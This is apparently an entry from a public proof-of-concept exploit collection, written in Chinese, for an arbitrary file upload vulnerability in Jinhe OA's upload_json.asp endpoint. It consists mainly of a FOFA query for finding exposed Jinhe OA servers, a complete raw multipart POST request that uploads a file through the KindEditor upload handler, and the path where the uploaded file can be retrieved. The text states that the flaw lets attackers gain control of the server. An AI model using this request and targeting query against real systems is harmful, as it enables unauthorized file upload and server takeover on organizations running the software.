## 金和OA_upload_json.asp存在任意文件上传漏洞

金和OA upload_json.asp存在任意文件上传漏洞，攻击者可通过此漏洞获取服务器权限。


## fofa
```
app="金和网络-金和OA"
```

## poc
```
POST /c6/KindEditor1/asp/upload_json.asp?dir=file HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Content-Length: 338
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------153857212076213662067051609723

-----------------------------153857212076213662067051609723
Content-Disposition: form-data; name="localUrl"


-----------------------------153857212076213662067051609723
Content-Disposition: form-data; name="imgFile"; filename="hhh.txt"
Content-Type: image/png

hhh
-----------------------------153857212076213662067051609723--
```

![image](https://github.com/wy876/POC/assets/139549762/2c14919b-e00d-49bf-8b94-21b5696bb8fe)

访问上传的文件
/c6/KindEditor1/asp/../attached/file/20240103/20240103164534323432.txt

![image](https://github.com/wy876/POC/assets/139549762/20dd3197-a7f9-4a74-863d-050603eab427)
